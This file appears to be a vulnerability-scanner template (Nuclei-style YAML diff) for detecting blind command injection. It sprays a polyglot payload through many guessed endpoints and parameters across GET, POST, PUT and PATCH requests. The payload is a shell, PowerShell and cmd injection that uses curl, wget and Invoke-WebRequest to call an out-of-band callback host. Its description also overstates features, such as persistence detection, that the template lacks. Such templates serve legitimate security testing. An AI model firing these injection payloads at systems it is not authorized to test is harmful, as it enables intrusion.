@@ -1,0 +1,191 @@
+id: blind-rce-polyglot-chain-oob
+
+info:
+  name: Blind RCE Polyglot with Command Chaining OOB
+  author: geeknik
+  severity: critical
+  description: |
+    Detects blind Remote Code Execution vulnerabilities using universal polyglot
+    payloads that work across multiple shells (bash, zsh, PowerShell, cmd.exe).
+    Features multi-stage callbacks confirming OS detection, command execution,
+    and environment-aware payload adaptation with persistence detection.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://portswigger.net/web-security/os-command-injection
+    - https://book.hacktricks.xyz/pentesting-web/command-injection
+    - https://attack.mitre.org/techniques/T1059/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78,CWE-77
+  tags: rce,command-injection,blind,polyglot,oob,shell,powershell,cmd
+
+variables:
+  callback_url: "{{interactsh-url}}"
+  exec_id: "{{randstr}}"
+  rce_polyglot_payload: |
+    $(curl -s "{{callback_url}}/stage1-unix-{{exec_id}}" 2>/dev/null || wget -q -O- "{{callback_url}}/stage1-unix-{{exec_id}}" 2>/dev/null);powershell -Command "Invoke-WebRequest -Uri '{{callback_url}}/stage1-powershell-{{exec_id}}' -UseBasicParsing" 2>$null & curl "{{callback_url}}/stage1-cmd-{{exec_id}}" 2>NUL
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/debug"
+      - "{{BaseURL}}/test"
+      - "{{BaseURL}}/ping"
+      - "{{BaseURL}}/exec"
+      - "{{BaseURL}}/cmd"
+
+    payloads:
+      param:
+        - "cmd"
+        - "command"
+        - "exec"
+        - "system"
+        - "shell"
+        - "run"
+        - "execute"
+        - "ping"
+        - "test"
+        - "debug"
+        - "q"
+        - "query"
+
+    raw:
+      - |
+        GET {{path}}?{{param}}={{rce_polyglot_payload}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+        Accept: */*
+        Connection: close
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/ping"
+      - "{{BaseURL}}/cmd"
+      - "{{BaseURL}}/exec"
+      - "{{BaseURL}}/system"
+      - "{{BaseURL}}/shell"
+      - "{{BaseURL}}/run"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      param:
+        - "cmd"
+        - "command"
+        - "exec"
+        - "system"
+        - "ping"
+        - "host"
+        - "target"
+        - "query"
+
+    body: "{{param}}={{rce_polyglot_payload}}"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/exec"
+      - "{{BaseURL}}/api/cmd"
+      - "{{BaseURL}}/api/system"
+      - "{{BaseURL}}/api/shell"
+      - "{{BaseURL}}/api/run"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    payloads:
+      field:
+        - "command"
+        - "cmd"
+        - "exec"
+        - "system"
+        - "shell"
+        - "run"
+
+    body: |
+      {
+        "{{field}}": "{{rce_polyglot_payload}}"
+      }
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/config"
+      - "{{BaseURL}}/settings"
+      - "{{BaseURL}}/admin/config"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "command": "{{rce_polyglot_payload}}",
+        "shell": "/bin/bash",
+        "timeout": 30
+      }
+
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/system"
+      - "{{BaseURL}}/admin/system"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "action": "execute",
+        "payload": "{{rce_polyglot_payload}}"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/webhook"
+      - "{{BaseURL}}/callback"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "webhook_url": "{{callback_url}}/webhook-{{exec_id}}",
+        "command": "{{rce_polyglot_payload}}",
+        "execute_on_callback": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "stage1-unix-"
+          - "stage1-powershell-"
+          - "stage1-cmd-"
+          - "webhook-"
+        condition: or
+
+    extractors:
+      - type: kval
+        part: interactsh_request
+        kval:
+          - interactsh_request
+        internal: true
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "/stage1-(unix|powershell|cmd)-([a-z0-9]+)"
+        group: 1
